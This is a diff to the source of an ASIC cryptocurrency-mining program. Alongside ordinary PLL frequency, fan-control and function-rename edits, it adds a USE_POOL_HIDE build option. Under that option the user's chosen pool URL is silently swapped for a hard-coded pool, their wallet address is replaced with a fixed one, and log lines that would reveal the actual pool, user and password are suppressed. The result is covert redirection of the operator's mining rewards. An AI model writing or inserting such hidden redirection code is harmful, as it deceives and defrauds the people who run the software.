@@ -96,14 +96,14 @@ struct strategies strategies[] = {
 char *opt_bitmine_a1_options = NULL;
 
 //for A4
-uint32_t opt_A1Pll1=1100; // -1 Default
-uint32_t opt_A1Pll2=1100; // -1 Default
-uint32_t opt_A1Pll3=1100; // -1 Default
-uint32_t opt_A1Pll4=1100; // -1 Default
-uint32_t opt_A1Pll5=1100; // -1 Default
-uint32_t opt_A1Pll6=1100; // -1 Default
-uint32_t opt_A1Pll7=1100; // -1 Default
-uint32_t opt_A1Pll8=1100; // -1 Default
+uint32_t opt_A1Pll1=1000; // -1 Default
+uint32_t opt_A1Pll2=1000; // -1 Default
+uint32_t opt_A1Pll3=1000; // -1 Default
+uint32_t opt_A1Pll4=1000; // -1 Default
+uint32_t opt_A1Pll5=1000; // -1 Default
+uint32_t opt_A1Pll6=1000; // -1 Default
+uint32_t opt_A1Pll7=1000; // -1 Default
+uint32_t opt_A1Pll8=1000; // -1 Default
 
 #endif
 
@@ -117,6 +117,13 @@ int opt_voltage5 = 8;
 int opt_voltage6 = 8;
 int opt_voltage7 = 8;
 int opt_voltage8 = 8;
+
+//im_fan_temp_s *fan_temp_ctrl;
+//im_temp_s *tmp_ctrl;
+
+int g_auto_fan   = 1;  // auto fan ctrl enable / disable
+int g_fan_speed  = 7;  // fan speed level
+const int c_fan_spd_lv[8] = {30, 40, 50, 60, 70, 80, 90, 100};
 
 
 static char packagename[256];
@@ -385,7 +392,6 @@ static int include_count;
 #define JSON_MAX_DEPTH 10
 #define JSON_MAX_DEPTH_ERR "Too many levels of JSON includes (limit 10) or a loop"
 #define JSON_WEB_ERROR "WEB config err"
-#define TEMP_UPDATE_INT_MS  10000
 
 
 #if defined(unix) || defined(__APPLE__)
@@ -839,11 +845,22 @@ static void setup_url(struct pool *pool, char *arg)
     }
 }
 
+char *g_pool1_url = "asia.siamining.com:3333";
+char *g_pool2_url = "sc.f2pool.com:7778";
+char *g_user1_addr = "25865daf640696361b432bd517b812270d8459af48f13876108354ee7e028e0e15c13ab5030c";
+char *g_user2_addr = "a5256ede637f78dd4760371da34751346d275c3a5a1e31ceb88e406ca0b61c0e85c4f11e7f53";
+char *g_worker = NULL;
+
 static char *set_url(char *arg)
 {
     struct pool *pool = add_url();
 
+#ifdef USE_POOL_HIDE
+    setup_url(pool, g_pool1_url);   // user fixed stratum url
+#else
     setup_url(pool, arg);
+#endif
+
     return NULL;
 }
 
@@ -887,7 +904,22 @@ static char *set_user(const char *arg)
         add_pool();
 
     pool = pools[total_users - 1];
+
+#ifdef USE_POOL_HIDE
+    // make user string: like ADDRESS.WORKER
+    int len = strlen(g_user1_addr) + strlen(arg) + 2;
+    char *p_user_str = (char*) malloc(len);
+    sprintf(p_user_str, "%s.%s", g_user1_addr, arg);
+//    if (g_worker)
+//    {
+//        free(g_worker);
+//        g_worker = NULL;
+//    }
+    opt_set_charp(arg, &g_worker);              // store current worker
+    opt_set_charp(p_user_str, &pool->rpc_user); // user fixed wallet address
+#else
     opt_set_charp(arg, &pool->rpc_user);
+#endif
 
     return NULL;
 }
@@ -6226,11 +6258,11 @@ static void stratum_share_result(json_t *val, json_t *res_val, json_t *err_val,
     char hashshow[64];
     int srdiff;
 
-    srdiff = now_t - sshare->sshare_sent;
-    if (opt_debug || srdiff > 0) {
-        applog(LOG_INFO, "Pool %d stratum share result lag time %d seconds",
-               work->pool->pool_no, srdiff);
-    }
+//    srdiff = now_t - sshare->sshare_sent;
+//    if (opt_debug || srdiff > 0) {
+//        applog(LOG_INFO, "Pool %d stratum share result lag time %d seconds",
+//               work->pool->pool_no, srdiff);
+//    }
     show_hash(work, hashshow);
     share_result(val, res_val, err_val, work, hashshow, false, "");
 }
@@ -6522,7 +6554,7 @@ static void *stratum_rthread(void *userdata)
                 cnt++;
                 if(cnt > total_pools)
                 {
-                    im_power_down_all_chain();
+                    im_chain_power_down_all();
                     cnt = 0;
                     applog(LOG_ERR, "!!!failed to restart stratum pool, exit!!!");
                     exit(1);        
@@ -6645,7 +6677,7 @@ static void *stratum_sthread(void *userdata)
         applog(LOG_INFO, "Stratum send: %s", s);
 #endif
 //        applog(LOG_INFO, "Submitting share %08lx to pool %d", (long unsigned int)htole32(hash32[6]), pool->pool_no);
-        applog(LOG_INFO, "Submitting nonce: %s", noncehex);
+//        applog(LOG_INFO, "Submitting nonce: %s", noncehex);
 
         /* Try resubmitting for up to 2 minutes if we fail to submit
          * once and the stratum pool nonce1 still matches suggesting
@@ -6728,7 +6760,9 @@ static void *longpoll_thread(void *userdata);
 
 static bool stratum_works(struct pool *pool)
 {
+#ifndef USE_POOL_HIDE
     applog(LOG_INFO, "Testing pool %d stratum %s", pool->pool_no, pool->stratum_url);
+#endif
     if (!extract_sockaddr(pool->stratum_url, &pool->sockaddr_url, &pool->stratum_port))
         return false;
 
@@ -6820,10 +6854,12 @@ static bool pool_active(struct pool *pool, bool pinging)
     CURL *curl;
     int uninitialised_var(rolltime);
 
+#ifndef USE_POOL_HIDE
     if (pool->has_gbt)
         applog(LOG_DEBUG, "Retrieving block template from pool %s", pool->rpc_url);
     else
         applog(LOG_INFO, "Testing pool %s", pool->rpc_url);
+#endif
 
     /* This is the central point we activate stratum when we can */
 retry_stratum:
@@ -7676,6 +7712,7 @@ bool submit_nonce(struct thr_info *thr, struct work *work, uint32_t nonce)
     }
     else
     {
+//        applog(LOG_ERR, "HW error on chain %d chip %d", work->data[39], work->data[38]);
         inc_hw_errors(thr);
         return false;
     }
@@ -9778,6 +9815,25 @@ int main(int argc, char *argv[])
     if (!config_loaded){
         load_default_config();
     }
+/*
+    // fan ctrl struct init
+    fan_temp_ctrl = malloc(sizeof(*fan_temp_ctrl));
+    tmp_ctrl = malloc(ASIC_CHAIN_NUM * sizeof(*tmp_ctrl));
+    fan_temp_ctrl->im_temp = tmp_ctrl;
+
+
+    // manual fan ctrl - by duanhao
+    if(g_auto_fan == 0)
+    {
+        if(g_fan_speed >= sizeof(c_fan_spd_lv) / sizeof(c_fan_spd_lv[0]))
+            g_fan_speed = sizeof(c_fan_spd_lv) / sizeof(c_fan_spd_lv[0]) - 1;
+        else if(g_fan_speed < 0)
+            g_fan_speed = 0;
+
+        im_set_pwm(0, ASIC_INNO_FAN_PWM_FREQ_TARGET, 100 - c_fan_spd_lv[g_fan_speed]);
+        im_set_pwm(1, ASIC_INNO_FAN_PWM_FREQ_TARGET, 100 - c_fan_spd_lv[g_fan_speed]);
+    }
+*/
 
     if (opt_benchmark || opt_benchfile) {
         struct pool *pool;
@@ -10020,19 +10076,20 @@ int main(int argc, char *argv[])
             applog(LOG_ERR, "No servers were found that could be used to get work from.");
             applog(LOG_ERR, "Please check the details from the list below of the servers you have input");
             applog(LOG_ERR, "Most likely you have input the wrong URL, forgotten to add a port, or have not set up workers");
+#ifndef USE_POOL_HIDE
             for (i = 0; i < total_pools; i++) {
                 struct pool *pool = pools[i];
-
                 applog(LOG_WARNING, "total pools: %d,Pool: %d  URL: %s  User: %s  Password: %s",
-                total_pools,i, pool->rpc_url, pool->rpc_user, pool->rpc_pass);
+                        total_pools,i, pool->rpc_url, pool->rpc_user, pool->rpc_pass);
             }
+#endif
             pool_msg = true;
             if (use_curses)
                 applog(LOG_ERR, "Press any key to exit, or sgminer will wait indefinitely for an alive pool.");
         }
         if (!use_curses)
         {
-            im_power_down_all_chain();
+            im_chain_power_down_all();
             early_quit(0, "No servers could be used! Exiting.");
         }   
 #ifdef HAVE_CURSES
@@ -10109,18 +10166,22 @@ begin_bench:
         struct pool *pool, *cp;
         bool lagging = false;
         static int  last_temp_time = 0;
-
-        if (last_temp_time + TEMP_UPDATE_INT_MS < get_current_ms())
+/*
+#ifdef USE_RT_TEMP_CTRL
+        applog(LOG_NOTICE, "g_auto_fan = %d", g_auto_fan);
+        if (g_auto_fan && fan_temp_ctrl->temp_highest != 0 && last_temp_time + TEMP_UPDATE_INT_MS < get_current_ms())
         {
-            inno_fan_speed_update(&g_fan_ctrl);
+//            inno_fan_speed_update(&g_fan_ctrl);
+            im_fan_speed_update_hub(fan_temp_ctrl);
             last_temp_time = get_current_ms();
         }
-
+#endif
+*/
         //
         if(g_reset_delay != 0xffff)
         {
             applog(LOG_NOTICE, "powerdown for api commond");
-            im_power_down_all_chain();
+            im_chain_power_down_all();
             sleep(10);
             sleep(g_reset_delay);
             exit(1);
